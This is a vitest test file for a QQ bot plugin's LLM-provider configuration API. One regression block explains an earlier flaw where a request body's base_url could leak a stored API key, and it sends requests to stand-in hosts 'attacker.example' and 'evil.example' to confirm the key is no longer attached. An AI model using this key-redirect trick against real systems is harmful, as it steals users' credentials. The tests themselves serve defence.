import { createMockContext } from '@qqbot/sdk/testing'
import type { PluginContext } from '@qqbot/sdk'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { createDefaultConfig, CONFIG_KEY } from './config/defaults.js'
import type { StoredConfig } from './config/types.js'
import plugin from './index.js'
import { CONFIG_READ_FAILED } from './store.js'

function sample(): StoredConfig {
  const config = createDefaultConfig()
  config.providers = [{
    id: 'p',
    name: 'P',
    protocol: 'openai',
    base_url: 'https://api.test/v1',
    api_key: 'sk-secret',
    enabled: true,
  }]
  config.models = [{ alias: 'chat', provider: 'p', model: 'm', enabled: true }]
  config.default_model = 'chat'
  return config
}

function route(path: string, method: string) {
  const found = plugin.routes!.find((item) => item.path === path && item.method === method)
  if (!found) throw new Error(`没有路由 ${method} ${path}`)
  return found
}

async function call(
  path: string,
  method: string,
  options: { body?: unknown; ctx?: PluginContext<unknown> } = {},
): Promise<Response> {
  const ctx = options.ctx ?? createMockContext(plugin)
  return route(path, method).handler({
    ctx,
    request: new Request(`https://bot.test/p/llm${path}`, {
      method,
      ...(options.body !== undefined ? { headers: { 'content-type': 'application/json' }, body: JSON.stringify(options.body) } : {}),
    }),
    params: { '*': '' },
    authenticated: true,
  })
}

async function seeded(config = sample()): Promise<PluginContext<unknown>> {
  const ctx = createMockContext(plugin)
  await ctx.kv.put(CONFIG_KEY, config)
  return ctx
}

function failingKV(): { ctx: PluginContext<unknown>; put: ReturnType<typeof vi.fn> } {
  const ctx = createMockContext(plugin)
  const put = vi.fn(async () => {})
  const kv = {
    ...ctx.kv,
    get: async () => {
      throw new Error('kv down')
    },
    put,
  }
  return { ctx: { ...ctx, kv } as unknown as PluginContext<unknown>, put }
}

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('页面与元信息', () => {
  it('/ui/* 返回单文件页面', async () => {
    const response = await call('/ui/*', 'GET')
    expect(response.headers.get('content-type')).toContain('text/html')
    const html = await response.text()
    expect(html).toContain('/bridge.js')
    expect(html).toContain('LLM 接口')
  })

  it('/api/meta 返回协议与限制', async () => {
    const response = await call('/api/meta', 'GET')
    const body = (await response.json()) as { protocols: Array<{ id: string }>; limits: { timeout_max: number } }
    expect(body.protocols.map((item) => item.id)).toEqual(['openai', 'anthropic'])
    expect(body.limits.timeout_max).toBe(28000)
  })
})

describe('配置读写', () => {
  it('GET 不回显 key', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'GET', { ctx })
    const body = (await response.json()) as { config: { providers: Array<Record<string, unknown>> } }
    expect(JSON.stringify(body)).not.toContain('sk-secret')
    expect(body.config.providers[0]?.['api_key_set']).toBe(true)
  })

  it('PUT 保留未提交的 key，并递增版本', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: {
          providers: [{ id: 'p', name: 'New', protocol: 'openai', base_url: 'https://api.test/v1', enabled: true }],
          models: [{ alias: 'chat', provider: 'p', model: 'm', enabled: true }],
          default_model: 'chat',
          request_timeout_ms: 25000,
          max_retries: 1,
        },
      },
    })
    expect(response.status).toBe(200)
    const stored = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(stored.providers[0]?.name).toBe('New')
    expect(stored.providers[0]?.api_key).toBe('sk-secret')
    expect(stored.version).toBe(2)
  })

  it('未知协议返回 400，不静默当成 openai', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: {
          providers: [{ id: 'g', name: 'G', protocol: 'gemini', base_url: 'https://api.test/v1', enabled: true }],
          models: [],
          default_model: '',
          request_timeout_ms: 25000,
          max_retries: 1,
        },
      },
    })
    expect(response.status).toBe(400)
    const stored = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(stored.providers[0]?.id).toBe('p')
  })

  it('版本冲突返回 409，配置错误返回 400', async () => {
    const ctx = await seeded()
    const conflict = await call('/api/config', 'PUT', {
      ctx,
      body: { version: 99, config: { providers: [], models: [], default_model: '', request_timeout_ms: 25000, max_retries: 1 } },
    })
    expect(conflict.status).toBe(409)

    const invalid = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: {
          providers: [{ id: 'p', protocol: 'openai', base_url: 'not-url', enabled: true }],
          models: [],
          default_model: '',
          request_timeout_ms: 25000,
          max_retries: 1,
        },
      },
    })
    expect(invalid.status).toBe(400)
    const body = (await invalid.json()) as { errors: unknown[] }
    expect(body.errors.length).toBeGreaterThan(0)
  })
})

describe('KV 读取失败', () => {
  it('GET /api/config 返回 503，不显示成空配置', async () => {
    const { ctx } = failingKV()
    const response = await call('/api/config', 'GET', { ctx })
    expect(response.status).toBe(503)
    const body = (await response.json()) as { error: string }
    expect(body.error).toBe(CONFIG_READ_FAILED)
  })

  it('PUT /api/config 返回 503，不写入 KV', async () => {
    const { ctx, put } = failingKV()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 0,
        config: { providers: [], models: [], default_model: '', request_timeout_ms: 25000, max_retries: 1 },
      },
    })
    expect(response.status).toBe(503)
    expect(put).not.toHaveBeenCalled()
  })

  it('/api/test 与 /api/upstream-models 返回 503', async () => {
    const { ctx } = failingKV()
    const testResponse = await call('/api/test', 'POST', { ctx, body: { target: { alias: 'chat' } } })
    expect(testResponse.status).toBe(503)

    const modelsResponse = await call('/api/upstream-models', 'POST', {
      ctx,
      body: { provider: { id: 'p', protocol: 'openai', base_url: 'https://api.test/v1', enabled: true } },
    })
    expect(modelsResponse.status).toBe(503)
  })
})

describe('配置损坏', () => {
  it('坏 JSON 返回 200 + corrupt，可用 version 0 覆盖保存', async () => {
    const ctx = createMockContext(plugin)
    await ctx.kv.put(CONFIG_KEY, '{not json')
    const response = await call('/api/config', 'GET', { ctx })
    expect(response.status).toBe(200)
    const body = (await response.json()) as {
      corrupt: boolean
      config: { version: number }
      issues: Array<{ message: string }>
    }
    expect(body.corrupt).toBe(true)
    expect(body.config.version).toBe(0)
    expect(body.issues.some((item) => item.message.includes('损坏'))).toBe(true)

    const saved = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 0,
        config: { providers: [], models: [], default_model: '', request_timeout_ms: 25000, max_retries: 1 },
      },
    })
    expect(saved.status).toBe(200)
    const stored = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(stored.version).toBe(1)
    expect(stored.providers).toEqual([])
  })

  it('合法 JSON 但不是对象也算损坏，不会被当成读失败', async () => {
    const ctx = createMockContext(plugin)
    await ctx.kv.put(CONFIG_KEY, '[]')
    const response = await call('/api/config', 'GET', { ctx })
    expect(response.status).toBe(200)
    const body = (await response.json()) as { corrupt: boolean }
    expect(body.corrupt).toBe(true)
  })

  it('安装钩子不覆盖已有损坏配置', async () => {
    const ctx = createMockContext(plugin)
    await ctx.kv.put(CONFIG_KEY, '{bad')
    await plugin.hooks!.onInstall!(ctx)
    expect(await ctx.kv.get(CONFIG_KEY)).toBe('{bad')
  })
})

describe('测试与模型发现', () => {
  it('/api/test 用草稿配置发起一次极小调用', async () => {
    const ctx = await seeded()
    vi.stubGlobal('fetch', vi.fn(async () =>
      Response.json({ choices: [{ message: { content: 'pong' }, finish_reason: 'stop' }] }),
    ))
    const response = await call('/api/test', 'POST', {
      ctx,
      body: {
        target: { alias: 'chat' },
        draft: {
          providers: [{ id: 'p', name: 'P', protocol: 'openai', base_url: 'https://api.test/v1', enabled: true }],
          models: [{ alias: 'chat', provider: 'p', model: 'm', enabled: true }],
          default_model: 'chat',
          request_timeout_ms: 25000,
          max_retries: 1,
        },
      },
    })
    expect(response.status).toBe(200)
    const body = (await response.json()) as { result: { ok: boolean; text?: string } }
    expect(body.result.ok).toBe(true)
    expect(body.result.text).toBe('pong')
  })

  it('/api/upstream-models 拒绝未知协议', async () => {
    const fetchMock = vi.fn()
    vi.stubGlobal('fetch', fetchMock)
    const response = await call('/api/upstream-models', 'POST', {
      body: { provider: { id: 'g', protocol: 'gemini', base_url: 'https://api.test/v1', enabled: true } },
    })
    expect(response.status).toBe(400)
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('/api/upstream-models 拉取并解析列表', async () => {
    const ctx = await seeded()
    vi.stubGlobal('fetch', vi.fn(async () => Response.json({ data: [{ id: 'm1' }, { id: 'm2' }] })))
    const response = await call('/api/upstream-models', 'POST', {
      ctx,
      body: { provider: { id: 'p', protocol: 'openai', base_url: 'https://api.test/v1', enabled: true } },
    })
    expect(response.status).toBe(200)
    const body = (await response.json()) as { models: string[] }
    expect(body.models).toEqual(['m1', 'm2'])
  })
})

/**
 * P0 回归：已存的 API Key 只能发往「已保存的那个地址」。
 *
 * 旧实现按 provider.id 无条件回填 KV 里的 key，于是请求体里写任意 base_url 就能把本机凭据
 * 作为 Authorization 头发出去（导入别人的配置再点「测试 / 刷新上游」即可窃取）。
 */
describe('密钥不会被发往请求体指定的新地址', () => {
  type FetchMock = ReturnType<typeof vi.fn<(input: RequestInfo | URL, init?: RequestInit) => Promise<Response>>>

  function fetchRecorder(): FetchMock {
    return vi.fn(async () => Response.json({ data: [{ id: 'm1' }] }))
  }

  function seenHeaders(fetchMock: FetchMock): Record<string, string> {
    const init = fetchMock.mock.calls[0]?.[1]
    return Object.fromEntries(new Headers(init?.headers ?? {}).entries())
  }

  it('/api/upstream-models 地址变了就不带已存 Key', async () => {
    const ctx = await seeded()
    const fetchMock = fetchRecorder()
    vi.stubGlobal('fetch', fetchMock)
    const response = await call('/api/upstream-models', 'POST', {
      ctx,
      body: { provider: { id: 'p', protocol: 'openai', base_url: 'https://attacker.example/v1', enabled: true } },
    })
    expect(response.status).toBe(200)
    expect(fetchMock.mock.calls[0]?.[0]).toBe('https://attacker.example/v1/models')
    expect(seenHeaders(fetchMock)['authorization']).toBeUndefined()
  })

  it('/api/upstream-models 地址没变仍然沿用已存 Key', async () => {
    const ctx = await seeded()
    const fetchMock = fetchRecorder()
    vi.stubGlobal('fetch', fetchMock)
    await call('/api/upstream-models', 'POST', {
      ctx,
      body: { provider: { id: 'p', protocol: 'openai', base_url: 'https://api.test/v1', enabled: true } },
    })
    expect(seenHeaders(fetchMock)['authorization']).toBe('Bearer sk-secret')
  })

  it('/api/test 的草稿改了地址也不带已存 Key', async () => {
    const ctx = await seeded()
    const fetchMock: FetchMock = vi.fn(async () => Response.json({ choices: [{ message: { content: 'pong' } }] }))
    vi.stubGlobal('fetch', fetchMock)
    await call('/api/test', 'POST', {
      ctx,
      body: {
        target: { provider: 'p' },
        draft: {
          providers: [{ id: 'p', name: 'P', protocol: 'openai', base_url: 'https://attacker.example/v1', enabled: true }],
          models: [{ alias: 'chat', provider: 'p', model: 'm', enabled: true }],
          default_model: 'chat',
          request_timeout_ms: 15000,
          max_retries: 1,
        },
      },
    })
    expect(fetchMock.mock.calls[0]?.[0]).toBe('https://attacker.example/v1/chat/completions')
    expect(seenHeaders(fetchMock)['authorization']).toBeUndefined()
  })

  it('PUT 改地址时清掉已存 Key，并回报 dropped_secrets', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: {
          providers: [{ id: 'p', name: 'P', protocol: 'openai', base_url: 'https://evil.example/v1', enabled: true }],
          models: [{ alias: 'chat', provider: 'p', model: 'm', enabled: true }],
          default_model: 'chat',
          request_timeout_ms: 15000,
          max_retries: 1,
        },
      },
    })
    expect(response.status).toBe(200)
    const body = (await response.json()) as { dropped_secrets: string[] }
    expect(body.dropped_secrets).toEqual(['p'])
    const stored = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(stored.providers[0]?.api_key).toBeUndefined()
  })

  it('providers:[null] 返回 400 而不是 500', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: { providers: [null], models: [], default_model: '', request_timeout_ms: 15000, max_retries: 1 },
      },
    })
    expect(response.status).toBe(400)
  })

  it('请求体按字节限流：中文超限返回 413', async () => {
    const ctx = await seeded()
    // 200K 个汉字 = 约 600 KB，超过 256 KB 的字节上限；按字符数算时会被放行
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: { version: 1, config: { providers: [], models: [], default_model: '中'.repeat(200 * 1024), request_timeout_ms: 15000, max_retries: 1 } },
    })
    expect(response.status).toBe(413)
  })
})

describe('安装钩子', () => {
  it('首次安装写入默认配置，已有配置不覆盖', async () => {
    const ctx = createMockContext(plugin)
    await plugin.hooks!.onInstall!(ctx)
    const first = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(first.version).toBe(1)
    expect(first.providers).toEqual([])

    const existing = sample()
    await ctx.kv.put(CONFIG_KEY, existing)
    await plugin.hooks!.onInstall!(ctx)
    const again = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(again.providers[0]?.api_key).toBe('sk-secret')
  })
})

describe('并发保存', () => {
  it('写前复查发现版本被别人改过时返回 409，不覆盖', async () => {
    const base = await seeded()
    // 模拟竞态：第一次读（乐观检查）返回 version 1，第二次读（写前复查）看到别处已经写成 99
    const originalGet = base.kv.get.bind(base.kv)
    let reads = 0
    const kv = {
      ...base.kv,
      get: async (key: string) => {
        reads += 1
        const value = await originalGet(key)
        if (reads >= 2 && value) {
          const parsed = JSON.parse(value) as StoredConfig
          parsed.version = 99
          return JSON.stringify(parsed)
        }
        return value
      },
    }
    const ctx = { ...base, kv } as typeof base
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: { providers: [], models: [], default_model: '', request_timeout_ms: 15000, max_retries: 1 },
      },
    })
    expect(response.status).toBe(409)
    // 没有写坏 KV：版本仍是被别人改成的 99
    const stored = (await kv.get(CONFIG_KEY)) as string
    expect((JSON.parse(stored) as StoredConfig).version).toBe(99)
  })

  it('版本一致时正常写入', async () => {
    const ctx = await seeded()
    const response = await call('/api/config', 'PUT', {
      ctx,
      body: {
        version: 1,
        config: { providers: [], models: [], default_model: '', request_timeout_ms: 15000, max_retries: 1 },
      },
    })
    expect(response.status).toBe(200)
    const stored = (await ctx.kv.getJSON(CONFIG_KEY)) as StoredConfig
    expect(stored.version).toBe(2)
  })
})
